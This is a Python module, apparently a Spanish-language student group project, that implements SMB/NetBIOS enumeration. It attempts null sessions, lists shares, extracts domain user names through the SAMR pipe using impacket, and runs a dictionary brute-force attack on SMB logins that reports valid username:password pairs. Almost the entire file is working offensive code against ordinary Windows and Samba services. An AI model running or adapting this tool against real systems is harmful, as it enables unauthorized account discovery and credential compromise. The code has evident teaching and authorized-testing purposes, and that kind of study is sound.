# Módulo desarrollado por el Grupo 2
# Fase II: Enumeración NetBIOS/SMB

import datetime
import logging
from typing import Any, Dict, List, Optional

try:
    from smb.SMBConnection import SMBConnection
    HAS_PYSMB = True
except ImportError:
    HAS_PYSMB = False


class SMBEnumerator:
    """
    Clase para realizar enumeración básica SMB/NetBIOS.

    Esta clase intenta establecer una sesión nula contra un objetivo autorizado
    y, si la conexión es exitosa, enumera los recursos compartidos disponibles.
    """

    def __init__(self, ip_address: str, port: int = 445) -> None:
        """
        Inicializa el enumerador SMB.

        Args:
            ip_address (str): Dirección IP o dominio del objetivo autorizado.
            port (int): Puerto SMB. Normalmente 445 o 139.
        """
        self.ip_address = ip_address
        self.port = port
        self.shares: List[Dict[str, Any]] = []
        self.users: List[str] = []
        self.connection: Optional[SMBConnection] = None
        self.null_session_established = False
        self.error_message: Optional[str] = None
        
        # Atributos del Estudiante 3 para el ataque de diccionario
        self.users_to_test: List[str] = []
        self.passwords_to_test: List[str] = []
        self.found_credentials: List[Dict[str, str]] = []

    def load_dictionaries(self, users_list: List[str], passwords_list: List[str]) -> None:
        """
        Carga las listas de usuarios y contraseñas para el ataque de diccionario.

        Args:
            users_list (List[str]): Lista de usuarios a probar.
            passwords_list (List[str]): Lista de contraseñas a probar.
        """
        self.users_to_test = users_list
        self.passwords_to_test = passwords_list

    def brute_force_login(self) -> List[Dict[str, str]]:
        """
        Realiza un ataque de diccionario contra el login de SMB (Estudiante 3).

        Returns:
            List[Dict[str, str]]: Lista de credenciales válidas encontradas.
        """
        if not HAS_PYSMB:
            self.error_message = "La librería pysmb no está instalada. Ejecute: pip install pysmb"
            print(f"[!] {self.error_message}")
            return self.found_credentials

        print(f"[*] Iniciando ataque de diccionario SMB contra {self.ip_address}:{self.port}...")
        
        for username in self.users_to_test:
            for password in self.passwords_to_test:
                try:
                    # Intentamos conectarnos con las credenciales actuales
                    conn = SMBConnection(
                        username,
                        password,
                        "brute_force_client",
                        self.ip_address,
                        use_ntlm_v2=True,
                        is_direct_tcp=(self.port == 445)
                    )
                    
                    success = conn.connect(self.ip_address, self.port, timeout=2)
                    
                    if success:
                        print(f"[!] ÉXITO (G2-E3): Credenciales válidas encontradas -> {username}:{password}")
                        self.found_credentials.append({
                            "user": username,
                            "password": password
                        })
                        if username not in self.users:
                            self.users.append(username)
                            
                    conn.close()
                    
                except Exception as e:
                    logging.debug(f"Intento fallido para {username}:{password} -> {e}")
                    
        return self.found_credentials


    def establish_null_session(self) -> bool:
        """
        Intenta establecer una sesión nula SMB.

        Returns:
            bool: True si la conexión anónima fue exitosa, False en caso contrario.
        """
        if not HAS_PYSMB:
            self.error_message = "La librería pysmb no está instalada. Ejecute: pip install pysmb"
            print(f"[!] {self.error_message}")
            return False

        try:
            print(f"[*] Intentando sesión nula SMB en {self.ip_address}:{self.port}")

            self.connection = SMBConnection(
                "",
                "",
                "python_client",
                self.ip_address,
                use_ntlm_v2=True,
                is_direct_tcp=(self.port == 445)
            )

            self.null_session_established = self.connection.connect(
                self.ip_address,
                self.port,
                timeout=5
            )

            return self.null_session_established

        except Exception as e:
            self.error_message = f"No se pudo establecer sesión nula: {str(e)}"
            logging.debug(f"Error en sesión nula hacia {self.ip_address}: {e}")
            return False

    def enumerate_shares(self) -> List[Dict[str, Any]]:
        """
        Enumera los recursos compartidos SMB disponibles.

        Returns:
            List[Dict[str, Any]]: Lista de recursos compartidos encontrados.
        """
        if not self.connection:
            return self.shares

        try:
            print("[*] Enumerando recursos compartidos SMB...")

            shares = self.connection.listShares(timeout=5)

            for share in shares:
                self.shares.append({
                    "name": share.name,
                    "comments": share.comments,
                    "type": str(share.type)
                })

        except Exception as e:
            self.error_message = f"No se pudieron enumerar recursos compartidos: {str(e)}"
            logging.debug(f"Error enumerando shares en {self.ip_address}: {e}")

        return self.shares

    def enumerate_users_sid(self) -> List[str]:
        """
        Estudiante 2: Enumera usuarios utilizando técnicas de sondeo de SID (RID Cycling).
        
        Aprovecha la sesión nula para conectarse al pipe SAMR vía DCERPC y 
        extraer los nombres de usuario asociados a los identificadores (RIDs).
        
        Returns:
            List[str]: Lista de usuarios encontrados.
        """
        # Verificamos que exista la sesión nula
        if not self.null_session_established:
            print("  [!] (G2-E2) Se requiere sesión nula para el sondeo de SID.")
            return self.users

        print(f"[*] (G2-E2) Iniciando sondeo de SID (SAMR/DCERPC) en {self.ip_address}...")
        
        try:
            # Importamos impacket localmente para no romper el script si el profesor no lo tiene
            from impacket.dcerpc.v5 import transport, samr
        except ImportError:
            self.error_message = "Librería 'impacket' no instalada. Requerida para sondeo SID."
            print(f"  [!] (G2-E2) {self.error_message}")
            print("      Ejecute: pip install impacket")
            return self.users

        try:
            # 1. Creamos el conducto (tubería) hacia la base de datos de seguridad (SAMR)
            string_binding = fr'ncacn_np:{self.ip_address}[\pipe\samr]'
            rpctransport = transport.DCERPCTransportFactory(string_binding)
            rpctransport.set_credentials('', '', '', '', '') # Credenciales nulas
            rpctransport.set_dport(self.port)
            
            # 2. Nos conectamos y enlazamos al servicio
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)
            
            # 3. Conectamos al servidor SAM
            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle']
            
            # 4. Obtenemos los dominios internos del servidor
            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp['Buffer']['Buffer']
            
            for domain in domains:
                domain_name = domain['Name']
                
                # Abrimos el dominio específico
                resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domain_name)
                resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=resp['DomainId'])
                domainHandle = resp['DomainHandle']
                
                # 5. ¡El Ataque! Empezamos a sondear los usuarios (RID Probing)
                status = samr.STATUS_MORE_ENTRIES
                enumerationContext = 0
                
                while status == samr.STATUS_MORE_ENTRIES:
                    try:
                        resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                        for user in resp['Buffer']['Buffer']:
                            username = user['Name']
                            rid = user['RelativeId']
                            
                            if username not in self.users:
                                self.users.append(username)
                                print(f"  [+] (G2-E2) Usuario extraído (RID {rid}): {username}")
                                
                        enumerationContext = resp['EnumerationContext']
                        status = resp['ErrorCode']
                    except Exception as e:
                        if str(e).find('STATUS_MORE_ENTRIES') >= 0:
                            status = samr.STATUS_MORE_ENTRIES
                        else:
                            break
                            
        except Exception as e:
            print(f"  [!] (G2-E2) Falló el sondeo SID: {str(e)}")
            logging.debug(f"Error SID Probing: {e}")
            
        return self.users

    def close_connection(self) -> None:
        """
        Cierra la conexión SMB si está activa.
        """
        try:
            if self.connection:
                self.connection.close()
        except Exception:
            pass

    def run(self) -> Dict[str, Any]:
        """
        Ejecuta la enumeración SMB completa.

        Returns:
            Dict[str, Any]: Resultado siguiendo el contrato de datos del proyecto.
        """
        print(f"[*] Iniciando enumeración SMB en {self.ip_address}:{self.port}")

        try:
            if self.establish_null_session():
                print("[+] Sesión nula establecida con éxito.")
                self.enumerate_shares()
                self.enumerate_users_sid()  
            else:
                print("[!] No se logró establecer sesión nula.")

            if self.users_to_test and self.passwords_to_test:
                self.brute_force_login()

        finally:
            self.close_connection()

        return {
            "modulo": "Enumeracion SMB",
            "grupo": 2,
            "estudiante": "E1/E2/E3",        
            "target": self.ip_address,
            "timestamp": datetime.datetime.now().isoformat(),
            "status": "success",
            "data": {
                "port": self.port,
                "null_session_established": self.null_session_established,
                "shares": self.shares,
                "users": self.users,
                "credenciales_encontradas": self.found_credentials
            },
            "error_message": self.error_message
        }



if __name__ == "__main__":
    import json
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"

    enum = SMBEnumerator(target)
    resultados = enum.run()

    print(json.dumps(resultados, indent=4, ensure_ascii=False))